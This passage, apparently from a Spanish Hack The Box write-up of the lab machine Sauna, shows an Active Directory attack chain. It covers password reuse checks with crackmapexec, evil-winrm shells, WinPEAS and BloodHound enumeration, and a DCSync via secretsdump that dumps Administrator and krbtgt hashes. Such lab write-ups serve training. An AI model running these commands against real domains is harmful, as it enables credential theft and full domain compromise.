+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
+index: 0xfad RID: 0x44f acb: 0x00000210 Account: HSmith	Name: Hugo Smith	Desc: <span class="o">(</span>null<span class="o">)</span>
+index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Key Distribution Center Service Account
+index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: svc_loanmgr	Name: L Manager	Desc: <span class="o">(</span>null<span class="o">)</span>
+rpcclient <span class="nv">$&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que hay otro usuario que reutiliza la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">--continue-on-success</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\h</span>smith:Thestrokes23 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>coins:Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\h</span>bear:Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>kerb:Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\b</span>taylor:Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>driver:Thestrokes23 STATUS_LOGON_FAILURE 
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>coins:Thestrokes23 STATUS_LOGON_FAILURE 
+</code></pre></div></div>
+
+<ul>
+  <li>Pero el usuario no puede conectarse usando <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.10.175 <span class="nt">-u</span> <span class="s1">'hsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
+SMB         10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span>
+HTTP        10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.175:5985/wsman
+WINRM       10.10.10.175    5985   SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\h</span>smith:Thestrokes23
+</code></pre></div></div>
+
+<h2 id="shell-fsmith">Shell fsmith</h2>
+
+<ul>
+  <li>Si verificamos con <strong>crackmapexec</strong> vemos que básicamente podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
+SMB         10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span>
+HTTP        10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.175:5985/wsman
+WINRM       10.10.10.175    5985   SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos conectamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>egotisticalbank<span class="se">\f</span>smith
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Estamos en la maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : htb
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::5c
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::dce2:4a20:8c87:aac7
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::dce2:4a20:8c87:aac7%7
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.175
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:a809%7
+                                       10.10.10.2
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; 
+
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
+4458764bef43511f00518e1a8900b5c4
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+
+<h2 id="shell-svc_loanmgr">Shell svc_loanmgr</h2>
+
+<ul>
+  <li>Nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que hay otro usuario <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> que no lo vimos en la web y no lo añadimos en la lista de usuarios que hicimos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt; net user
+
+User accounts <span class="k">for</span> <span class="se">\\</span>
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The <span class="nb">command </span>completed with one or more errors.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Si miramos mas información del usuario vemos que pertenece al grupo <strong>Remote Management Users</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt; net user svc_loanmgr
+User name                    svc_loanmgr
+Full Name                    L Manager
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/24/2020 4:48:31 PM
+Password expires             Never
+Password changeable          1/25/2020 4:48:31 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; 
+</span></code></pre></div></div>
+
+<ul>
+  <li>Vamos a crear un directorio para subir el <strong>Winpeas</strong> para enumerar un poco el sistema <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230604-b0985b44">https://github.com/carlospolop/PEASS-ng/releases/tag/20230604-b0985b44</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop&gt; <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>Prives
+
+
+    Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----         6/9/2023   7:02 PM                Prives
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>Prives
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt; 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt; upload /home/miguel7/Hackthebox/Sauna/content/winPEASx64.exe
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Sauna/content/winPEASx64.exe to C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives<span class="se">\w</span>inPEASx64.exe
+                                        
+Data: 2704724 bytes of 2704724 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a correrlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt; .<span class="se">\w</span>inPEASx64.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Después de correr el <strong>winPEASx64.exe</strong> vemos que nos encontró credenciales.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web4.png" />
+</p>
+
+<p><code class="language-plaintext highlighter-rouge">svc_loanmanager:Moneymakestheworldgoround!</code></p>
+
+<ul>
+  <li><strong>Crackmapexec</strong> nos dice que no son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmanager'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmanager:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
+</code></pre></div></div>
+
+<ul>
+  <li>Pero bueno lo mas probable es que no sean correctas por que como tal este usuario no existe en el dominio pero hay otro usuario que se llama <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> así que si probamos con ese usuario si son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmgr'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:Moneymakestheworldgoround! 
+</code></pre></div></div>
+
+<ul>
+  <li>Y también nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmgr'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
+SMB         10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span>
+HTTP        10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.175:5985/wsman
+WINRM       10.10.10.175    5985   SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:Moneymakestheworldgoround! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos conectamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmgr'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>egotisticalbank<span class="se">\s</span>vc_loanmgr
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>No vemos nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Después de enumerar el sistema no encontré nada pero bueno vamos a usar una herramienta que es la primera vez que la uso en esta maquina que es <strong>Bloodhound</strong> que te ayuda a decirte como puedes escalar privilegios lo que tenemos que hacer es subir el <strong>SharpHoung.ps1</strong> <a href="https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1">https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>Antes de usar todo esto tenemos que tener esta opción en <strong>11</strong> si no da error al correr <strong>neo4j</strong> pues pon la versión que te digan.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ update-alternatives <span class="nt">--config</span> java
+Existen 2 opciones para la alternativa java <span class="o">(</span>que provee /usr/bin/java<span class="o">)</span><span class="nb">.</span>
+
+  Selección   Ruta                                         Prioridad  Estado
+<span class="nt">------------------------------------------------------------</span>
+  0            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      modo automático
+<span class="k">*</span> 1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      modo manual
+  2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      modo manual
+
+Pulse &lt;Intro&gt; para mantener el valor por omisión <span class="o">[</span><span class="k">*</span><span class="o">]</span> o pulse un número de selección: ^C
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora iniciamos el <strong>neo4j</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ neo4j start
+Directories <span class="k">in </span>use:
+home:         /var/lib/neo4j
+config:       /etc/neo4j
+logs:         /var/log/neo4j
+plugins:      /var/lib/neo4j/plugins
+import:       /var/lib/neo4j/import
+data:         /var/lib/neo4j/data
+certificates: /var/lib/neo4j/certificates
+licenses:     /var/lib/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+Started neo4j <span class="o">(</span>pid:140609<span class="o">)</span><span class="nb">.</span> It is available at http://localhost:7474
+There may be a short delay <span class="k">until </span>the server is ready.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos conectamos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web5.png" />
+</p>
+
+<ul>
+  <li>Ahora vamos a ejecutar <strong>Bloodhound</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ bloodhound &amp;&gt; /dev/null &amp; <span class="nb">disown</span>
+<span class="o">[</span>1] 143656
+</code></pre></div></div>
+
+<ul>
+  <li>Va abrir algo así.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web6.png" />
+</p>
+
+<ul>
+  <li>Ahora si esta todo listo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web7.png" />
+</p>
+
+<ul>
+  <li>Ahora vamos a subir el <strong>SharpHound</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; upload SharpHound.ps1
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Sauna/nmap/SharpHound.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments<span class="se">\S</span>harpHound.ps1
+                                        
+Data: 1744464 bytes of 1744464 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         6/9/2023   7:40 PM        1308348 SharpHound.ps1
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a importar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>harpHound.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a Invocar el modulo para que recolecte toda la información del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; Invoke-BloodHound <span class="nt">-CollectionMethod</span> All
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos crea el comprimido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         6/9/2023   8:10 PM           9117 20230609201055_BloodHound.zip
+<span class="nt">-a----</span>         6/9/2023   7:57 PM         973325 SharpHound.ps1
+<span class="nt">-a----</span>         6/9/2023   8:10 PM          11122 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; download 20230609201055_BloodHound.zip bloodhound.zip
+                                        
+Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments<span class="se">\2</span>0230609201055_BloodHound.zip to bloodhound.zip
+                                        
+Info: Download successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Hay tenemos el archivo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">ls</span>
+ allPorts   bloodhound.zip   SharpHound.ps1   targeted
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno ahora subimos el <strong>.zip</strong>.</li>
+</ul>
+
+<p>-Y ya encontramos algo interesante.</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web8.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web9.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Podemos realizar un ataque <strong>DCSync</strong> para obtener el hash del usuario admin y poder así hacer <strong>passthehash</strong>.</p>
+  </li>
+  <li>
+    <p>Para esto vamos a usar una herramienta de <strong>impacket</strong> que es <code class="language-plaintext highlighter-rouge">secretsdump</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:<span class="s1">'Moneymakestheworldgoround!'</span>@10.10.10.175
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:fbeccb6e8cdf75d891399c53b4581823:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
